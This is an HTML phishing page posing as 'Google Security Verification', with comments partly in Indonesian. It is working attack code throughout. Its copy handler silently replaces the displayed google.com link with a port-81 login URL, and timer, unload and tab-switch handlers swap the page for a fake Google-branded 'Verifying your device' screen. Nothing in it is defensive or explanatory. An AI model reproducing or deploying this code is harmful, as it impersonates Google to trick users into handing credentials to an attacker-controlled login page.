<!DOCTYPE HTML>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Verification</title>
    <style>
        body { 
            font-family: -apple-system, sans-serif; 
            text-align: center; 
            padding-top: 50px; 
            margin: 0;
        }
        #tst { 
            padding: 12px; 
            border: 1px solid #ccc; 
            border-radius: 8px; 
            width: 80%; 
            max-width: 350px; 
            margin-bottom: 15px; 
            background: #f1f3f4;
        }
        button { 
            padding: 12px 24px; 
            background-color: #1a73e8; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div id="main-content">
        <h3>Account Action Required</h3>
        <p>Copy the secure link and paste it into the address bar to verify your session.</p>
        
        <input id="tst" value="https://www.google.com" disabled><br>
        <button onclick="copyt()">Copy Link</button>
    </div>

    <script>
        // 1. CLIPBOARD HIJACKING LOGIC
        const tst = document.getElementById('tst');
        
        function copyt() {
            tst.disabled = false;
            tst.select();
            document.execCommand('copy');
            tst.disabled = true;
            alert("Link copied! Paste it into the address bar and press Enter.");
        }

        tst.oncopy = function(e) {
            // URL dengan port :81 yang akan disamarkan nantinya
            e.clipboardData.setData('text/plain', 'http://google.com:81/login.html');
            e.preventDefault();
        }

        // 2. SPOOFING DISPLAY (Gambar di Tengah)
        function triggerSpoof() {
            document.body.innerHTML = `
                <div style="
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    width: 100vw;
                    background-color: #ffffff;
                    position: fixed;
                    top: 0;
                    left: 0;
                    z-index: 9999;
                ">
                    <div style="text-align: center;">
                        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" 
                             style="max-width: 180px; height: auto;">
                        <p style="color: #5f6368; font-size: 16px; margin-top: 20px;">
                            Verifying your device...
                        </p>
                    </div>
                </div>
            `;
            document.title = "Google";
        }

        // 3. TIMER & NAVIGATION INTERRUPT
        // Muncul otomatis setelah 5 detik
        setTimeout(function() {
            console.log("Timer triggered spoof");
            triggerSpoof();
        }, 5000);

        // Memicu saat navigasi (Paste & Enter) atau pindah tab
        window.onbeforeunload = function() {
            triggerSpoof();
        };

        // Menangani kasus pindah tab di iOS
        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'hidden') {
                // Saat user meninggalkan tab, kita siapkan tampilan spoof
                triggerSpoof();
            }
        });
    </script>
</body>
</html>
